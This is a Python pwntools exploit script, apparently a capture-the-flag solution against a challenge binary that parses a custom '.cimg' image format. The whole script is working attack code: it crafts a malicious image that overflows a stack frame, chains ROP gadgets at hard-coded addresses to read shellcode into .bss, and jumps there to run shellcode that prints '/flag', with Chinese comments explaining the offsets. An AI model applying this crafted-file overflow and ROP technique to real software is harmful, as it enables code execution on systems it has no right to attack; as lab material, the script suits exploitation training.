#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.os = "linux"

BINARY = "/challenge/integration-cimg-screenshot-sc"
elf = ELF(BINARY)

sc = asm(shellcraft.cat("/flag"))

BSS_ADDR = 0x405020

GADGET_1 = 0x402128  # mov rax, r12; pop rbx; pop rbp; pop r12; ret;
GADGET_2 = 0x401C08  # mov edx, r13d; mov rsi, rax; mov edi, ebp; call sym.read_exact

# 偏移计算：sub rsp, 0x98 (152 bytes) - 局部变量起始点 var_10h (16 bytes) = 136 bytes
OFFSET_REGS = 136

# 精准配置 ROP Chain
rop_chain = flat(
    {
        OFFSET_REGS: [
            # === 劫持 handle_1337 的 Epilogue ===
            BSS_ADDR,  # saved rbx: 给稍后的 strncmp 用的合法指针
            0,  # saved rbp: 给 Gadget 2 当 fd = 0 用
            BSS_ADDR,  # saved r12: 给 Gadget 1 当源寄存器用
            0x100,  # saved r13: 给 Gadget 2 当 read size (edx)
            GADGET_1,  # saved RIP: 跳转到 Gadget 1
            # === Gadget 1 运行时的 Stack ===
            BSS_ADDR,  # pop rbx
            0,  # pop rbp (fd = 0)
            0,  # pop r12
            GADGET_2,  # ret 到 Gadget 2
        ]
    },
    filler=b"\x00",
)  # 摒弃 0x90，使用纯正的 0x00 作为极简填充

# Gadget 2 执行完 read_exact 后，会顺着 handle_5 执行：
# call close(edi) -> add rsp, 0x118 -> pop rbx, rbp, r12, r13 -> ret
# 我们必须准确跨越这些 stack frame 以控制最终的 RIP
PADDING_HANDLE_5 = 0x118 + 0x20
rop_chain += b"\x00" * PADDING_HANDLE_5
rop_chain += p64(BSS_ADDR)  # Final RIP: 跳转到 .bss 执行 Shellcode

# 动态设定 frame 尺寸以容纳我们的 ROP
width = 255
height = 4
frame_data = rop_chain.ljust(width * height, b"\x00")

# 组装纯净的 .cimg Payload
cimg_payload = b"cIMG" + p16(4) + p16(0) + p32(2)
cimg_payload += p16(2) + p8(0) + p8(0) + p8(width) + p8(height) + frame_data  # 注入 ROP
cimg_payload += p16(0x539) + p8(0) + p8(0) + p8(0) + p8(width) + p8(height)  # 触发漏洞
cimg_payload += sc  # 将 Shellcode 附加在文件末尾，等待 Gadget 2 来读取！

with open("payload.cimg", "wb") as f:
    f.write(cimg_payload)
# io = gdb.debug(
#     [BINARY, "payload.cimg"],
#     env={"SHELL": "/bin/bash"},
#     gdbscript="""
#     b *0x00401e99\n
#     continue
#     ni
#     """,
# )
io = process([BINARY, "payload.cimg"])

io.interactive()
